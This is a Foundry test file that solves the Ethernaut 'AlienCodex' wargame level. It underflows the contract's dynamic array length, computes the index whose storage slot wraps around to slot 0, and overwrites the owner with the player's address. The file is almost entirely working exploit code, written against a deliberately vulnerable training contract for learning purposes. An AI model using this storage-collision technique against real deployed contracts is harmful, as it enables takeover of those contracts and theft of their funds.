// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";

contract AlienCodexTest is Test {
    Ethernaut ethernaut;
    address player = address(123456);
    address levelAddress;
    address instanceAddress;

    function setUp() public {
        ethernaut = new Ethernaut();

        // Run `forge build` to generate json abis before test
        bytes memory levelCode = abi.encodePacked(
            vm.getCode("./out/AlienCodexFactory.sol/AlienCodexFactory.json")
        );

        address _levelAddress;
        assembly {
            _levelAddress := create(0, add(levelCode, 0x20), mload(levelCode))
        }
        levelAddress = _levelAddress;
        Level level = Level(levelAddress);
        ethernaut.registerLevel(level);

        startHoax(player);

        instanceAddress = ethernaut.createLevelInstance(level);
    }

    function testAlienCodexHack() public {
        bool success;
        bytes memory data;
        (success, data) = instanceAddress.call(
            abi.encodeWithSignature("make_contact()")
        );
        (success, data) = instanceAddress.call(
            abi.encodeWithSignature("retract()")
        );

        // Slot 0 = owner (20 bytes) + contact (1 byte)
        bytes32 slot0 = vm.load(instanceAddress, bytes32(uint256(0)));
        emit log_named_bytes32("slot 0", slot0);
        // Slot 1 = codex length
        bytes32 slot1 = vm.load(instanceAddress, bytes32(uint256(1)));
        emit log_named_bytes32("slot 1", slot1);
        uint256 max = type(uint256).max;
        assertEq(slot1, bytes32(max));

        // codex first element slot start from
        bytes32 codexFirstSlot = keccak256(abi.encodePacked(uint256(1)));
        emit log_named_bytes32("codex first slot", codexFirstSlot);

        // to collision with slot 0, it needs
        uint256 i = max - uint256(codexFirstSlot) + 1;

        (success, data) = instanceAddress.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                i,
                bytes32(abi.encode(player))
            )
        );

        (success, data) = instanceAddress.call(
            abi.encodeWithSignature("owner()")
        );
        assertEq(data, abi.encode(player));

        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
